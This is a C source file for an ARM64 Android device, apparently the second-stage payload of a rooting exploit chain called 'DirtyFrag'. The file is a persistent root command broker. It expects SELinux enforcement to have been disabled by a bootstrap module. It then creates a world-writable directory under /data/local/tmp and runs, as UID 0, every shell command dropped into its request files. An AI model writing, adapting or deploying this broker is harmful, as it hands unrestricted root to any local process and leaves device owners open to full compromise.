/*
 * Persistent UID 0 command broker for DBY2-W00.
 *
 * DirtyFrag starts this executable through call_usermodehelper after the
 * bootstrap module disables AVC checks. The broker never changes syscall
 * tables; it only executes /system/bin/sh commands requested through files
 * under /data/local/tmp/dfroot-root.
 */
typedef unsigned long size_t;
typedef long ssize_t;

#define AT_FDCWD (-100L)
#define AT_REMOVEDIR 0200L
#define O_RDONLY 0L
#define O_WRONLY 1L
#define O_CREAT 0100L
#define O_TRUNC 01000L
#define O_CLOEXEC 02000000L

#define SIGCHLD 17L
#define SIGKILL 9L

#define SYS_dup3 24L
#define SYS_mkdirat 34L
#define SYS_unlinkat 35L
#define SYS_fchmodat 53L
#define SYS_openat 56L
#define SYS_close 57L
#define SYS_read 63L
#define SYS_write 64L
#define SYS_fsync 82L
#define SYS_exit 93L
#define SYS_nanosleep 101L
#define SYS_kill 129L
#define SYS_clone 220L
#define SYS_execve 221L
#define SYS_wait4 260L

#define SLOT_COUNT 8
#define WNOHANG 1L

static const char broker_dir[] = "/data/local/tmp/dfroot-root";
static const char ready_path[] = "/dev/dfroot-ok";
static const char shell_path[] = "/system/bin/sh";

static long sys_call4(long number, long arg0, long arg1, long arg2, long arg3) {
  register long x8 __asm__("x8") = number;
  register long x0 __asm__("x0") = arg0;
  register long x1 __asm__("x1") = arg1;
  register long x2 __asm__("x2") = arg2;
  register long x3 __asm__("x3") = arg3;
  __asm__ volatile("svc #0"
                   : "=r"(x0)
                   : "r"(x8), "0"(x0), "r"(x1), "r"(x2), "r"(x3)
                   : "memory", "cc");
  return x0;
}

static long sys_call3(long number, long arg0, long arg1, long arg2) {
  return sys_call4(number, arg0, arg1, arg2, 0);
}

static long sys_call2(long number, long arg0, long arg1) {
  return sys_call4(number, arg0, arg1, 0, 0);
}

static void sleep_milliseconds(long milliseconds) {
  struct {
    long seconds;
    long nanoseconds;
  } interval = {
      .seconds = milliseconds / 1000,
      .nanoseconds = (milliseconds % 1000) * 1000000,
  };
  sys_call2(SYS_nanosleep, (long)&interval, 0);
}

static int write_all(int file_descriptor, const char *data, size_t length) {
  size_t written = 0;
  while (written < length) {
    long result = sys_call3(SYS_write, file_descriptor,
                            (long)(data + written),
                            (long)(length - written));
    if (result <= 0) {
      return 0;
    }
    written += (size_t)result;
  }
  return 1;
}

static void write_number(int file_descriptor, int value) {
  char digits[16];
  int position = sizeof(digits);
  unsigned int remaining;
  int negative = value < 0;

  remaining = negative ? (unsigned int)-value : (unsigned int)value;
  do {
    digits[--position] = (char)('0' + remaining % 10);
    remaining /= 10;
  } while (remaining);
  if (negative) {
    digits[--position] = '-';
  }
  write_all(file_descriptor, &digits[position],
            (size_t)(sizeof(digits) - position));
}

static int create_file(const char *path) {
  return (int)sys_call4(SYS_openat, AT_FDCWD, (long)path,
                        O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
}

static int path_exists(const char *path) {
  int file_descriptor =
      (int)sys_call4(SYS_openat, AT_FDCWD, (long)path,
                     O_RDONLY | O_CLOEXEC, 0);
  if (file_descriptor < 0) {
    return 0;
  }
  sys_call2(SYS_close, file_descriptor, 0);
  return 1;
}

static size_t append_text(char *target, size_t position, const char *text) {
  while (*text) {
    target[position++] = *text++;
  }
  return position;
}

static void build_slot_path(char *target, const char *kind, int slot) {
  size_t position = append_text(target, 0, broker_dir);
  target[position++] = '/';
  position = append_text(target, position, kind);
  target[position++] = (char)('0' + slot);
  target[position] = 0;
}

static void create_ready_marker(void) {
  int ready_fd = create_file(ready_path);
  if (ready_fd >= 0) {
    write_all(ready_fd, "dfroot-root-broker\n", 20);
    sys_call2(SYS_close, ready_fd, 0);
  }
}

static int read_request(const char *request_path, char *command,
                        size_t capacity) {
  int request_fd =
      (int)sys_call4(SYS_openat, AT_FDCWD, (long)request_path,
                     O_RDONLY | O_CLOEXEC, 0);
  if (request_fd < 0) {
    return 0;
  }

  ssize_t read_size =
      sys_call3(SYS_read, request_fd, (long)command, (long)(capacity - 1));
  sys_call2(SYS_close, request_fd, 0);
  sys_call4(SYS_unlinkat, AT_FDCWD, (long)request_path, 0, 0);
  if (read_size < 0) {
    return -1;
  }

  command[read_size] = 0;
  while (read_size > 0 &&
         (command[read_size - 1] == '\n' ||
          command[read_size - 1] == '\r')) {
    command[--read_size] = 0;
  }
  return read_size > 0;
}

static int run_command(const char *command, const char *output_path,
                       const char *lock_path) {
  long child = sys_call4(SYS_clone, SIGCHLD, 0, 0, 0);
  if (child < 0) {
    return 127;
  }
  if (child == 0) {
    int output_fd = create_file(output_path);
    if (output_fd < 0) {
      sys_call2(SYS_exit, 127, 0);
    }
    sys_call3(SYS_dup3, output_fd, 1, 0);
    sys_call3(SYS_dup3, output_fd, 2, 0);
    sys_call2(SYS_close, output_fd, 0);

    char *arguments[] = {
        (char *)"sh",
        (char *)"-c",
        (char *)command,
        (char *)0,
    };
    char *environment[] = {
        (char *)"PATH=/system/bin:/vendor/bin",
        (char *)0,
    };
    sys_call4(SYS_execve, (long)shell_path, (long)arguments,
              (long)environment, 0);
    sys_call2(SYS_exit, 127, 0);
  }

  int wait_status = 0;
  for (;;) {
    long waited = sys_call4(SYS_wait4, child, (long)&wait_status, WNOHANG, 0);
    if (waited == child || waited < 0) {
      break;
    }
    if (!path_exists(lock_path)) {
      sys_call2(SYS_kill, child, SIGKILL);
      sys_call4(SYS_wait4, child, (long)&wait_status, 0, 0);
      break;
    }
    sleep_milliseconds(50);
  }
  if ((wait_status & 0x7f) == 0) {
    return (wait_status >> 8) & 0xff;
  }
  return 128 + (wait_status & 0x7f);
}

static void publish_result(int exit_status, const char *status_path,
                           const char *done_path) {
  int status_fd = create_file(status_path);
  if (status_fd >= 0) {
    write_number(status_fd, exit_status);
    write_all(status_fd, "\n", 1);
    sys_call2(SYS_fsync, status_fd, 0);
    sys_call2(SYS_close, status_fd, 0);
  }

  int done_fd = create_file(done_path);
  if (done_fd >= 0) {
    write_all(done_fd, "done\n", 5);
    sys_call2(SYS_fsync, done_fd, 0);
    sys_call2(SYS_close, done_fd, 0);
  }
}

static void reap_workers(void) {
  int wait_status = 0;
  while (sys_call4(SYS_wait4, -1, (long)&wait_status, WNOHANG, 0) > 0) {
  }
}

static void start_worker(int slot, const char *command) {
  long child = sys_call4(SYS_clone, SIGCHLD, 0, 0, 0);
  if (child != 0) {
    return;
  }

  char output_path[96];
  char status_path[96];
  char done_path[96];
  char lock_path[96];
  char busy_path[96];
  build_slot_path(output_path, "output", slot);
  build_slot_path(status_path, "status", slot);
  build_slot_path(done_path, "done", slot);
  build_slot_path(lock_path, "lock", slot);
  build_slot_path(busy_path, "busy", slot);

  int exit_status = run_command(command, output_path, lock_path);
  publish_result(exit_status, status_path, done_path);
  sys_call4(SYS_unlinkat, AT_FDCWD, (long)busy_path, 0, 0);
  sys_call2(SYS_exit, 0, 0);
}

void stage2_main(void) {
  sys_call4(SYS_mkdirat, AT_FDCWD, (long)broker_dir, 0777, 0);
  sys_call4(SYS_fchmodat, AT_FDCWD, (long)broker_dir, 0777, 0);

  for (int slot = 0; slot < SLOT_COUNT; slot++) {
    char request_path[96];
    char output_path[96];
    char status_path[96];
    char done_path[96];
    char lock_path[96];
    char busy_path[96];
    build_slot_path(request_path, "request", slot);
    build_slot_path(output_path, "output", slot);
    build_slot_path(status_path, "status", slot);
    build_slot_path(done_path, "done", slot);
    build_slot_path(lock_path, "lock", slot);
    build_slot_path(busy_path, "busy", slot);
    sys_call4(SYS_unlinkat, AT_FDCWD, (long)lock_path, AT_REMOVEDIR, 0);
    sys_call4(SYS_unlinkat, AT_FDCWD, (long)busy_path, 0, 0);
    sys_call4(SYS_unlinkat, AT_FDCWD, (long)request_path, 0, 0);
    sys_call4(SYS_unlinkat, AT_FDCWD, (long)output_path, 0, 0);
    sys_call4(SYS_unlinkat, AT_FDCWD, (long)status_path, 0, 0);
    sys_call4(SYS_unlinkat, AT_FDCWD, (long)done_path, 0, 0);
  }

  create_ready_marker();

  for (;;) {
    int handled_request = 0;
    for (int slot = 0; slot < SLOT_COUNT; slot++) {
      char request_path[96];
      char command[65536];
      build_slot_path(request_path, "request", slot);
      int request_result =
          read_request(request_path, command, sizeof(command));
      if (request_result > 0) {
        char busy_path[96];
        build_slot_path(busy_path, "busy", slot);
        int busy_file_descriptor = create_file(busy_path);
        if (busy_file_descriptor >= 0) {
          sys_call2(SYS_close, busy_file_descriptor, 0);
        }
        start_worker(slot, command);
        handled_request = 1;
      }
    }

    reap_workers();
    if (!handled_request) {
      sleep_milliseconds(20);
    }
  }
}

__attribute__((naked)) void _start(void) {
  __asm__ volatile(
      "bl stage2_main\n"
      "mov x8, #94\n"
      "svc #0\n");
}
